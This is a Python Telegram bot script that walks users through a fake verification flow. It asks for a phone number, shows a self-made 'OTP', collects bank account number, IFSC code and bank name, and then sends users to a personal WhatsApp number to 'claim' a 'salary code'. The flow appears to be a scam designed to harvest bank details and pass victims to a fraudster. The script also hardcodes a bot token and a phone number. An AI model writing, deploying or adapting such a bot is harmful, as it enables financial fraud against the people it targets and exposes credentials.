import telebot
import random
from telebot import types

TOKEN = "7969758622:AAEoQS_FNCL4mWb-gfZ2fBhLqLP5yY1zaAs"
bot = telebot.TeleBot(TOKEN)

user_state = {}
otp_storage = {}
salary_code = "HCPYRF"

@bot.message_handler(commands=['start'])
def start(m):
    user_state[m.chat.id] = 'ASK_PHONE'
    bot.send_message(m.chat.id, "👋 Please enter your Telegram number:")

@bot.message_handler(func=lambda m: True)
def handle(m):
    cid = m.chat.id
    text = m.text
    state = user_state.get(cid, '')

    if state == 'ASK_PHONE':
        otp = str(random.randint(1000, 9999))
        otp_storage[cid] = otp
        user_state[cid] = 'ASK_OTP'
        bot.send_message(cid, f"📩 Your OTP is: {otp}")
        return

    if state == 'ASK_OTP':
        if text == otp_storage.get(cid):
            user_state[cid] = 'ASK_BANK_BTN'
            kb = types.ReplyKeyboardMarkup(resize_keyboard=True)
            kb.add("✅ Verify your bank account")
            bot.send_message(cid, "✅ OTP verified!", reply_markup=kb)
        else:
            bot.send_message(cid, "❌ Invalid OTP. Try again.")
        return

    if state == 'ASK_BANK_BTN' and text.startswith("✅"):
        user_state[cid] = 'ASK_BANK'
        bot.send_message(cid, "Enter bank details like:\nA/C, IFSC, Bank Name")
        return

    if state == 'ASK_BANK':
        if ',' in text and len(text.split(',')) == 3:
            user_state[cid] = 'ASK_CODE'
            markup = types.InlineKeyboardMarkup()
            markup.add(types.InlineKeyboardButton("📩 Claim your code", url="https://wa.me/918478026369?text=Hi,+I+have+completed+steps"))
            bot.send_message(cid, "✅ Bank saved. Click below:", reply_markup=markup)
        else:
            bot.send_message(cid, "❌ Invalid format. Use: A/C, IFSC, Bank")
        return

    if state == 'ASK_CODE':
        if text == salary_code:
            bot.send_message(cid, "🎉 Code verified! Your request is submitted.")
        else:
            bot.send_message(cid, "❌ Invalid code.")
        return

    bot.send_message(cid, "⚠️ Please follow the steps. Start with /start")

bot.polling(none_stop=True)
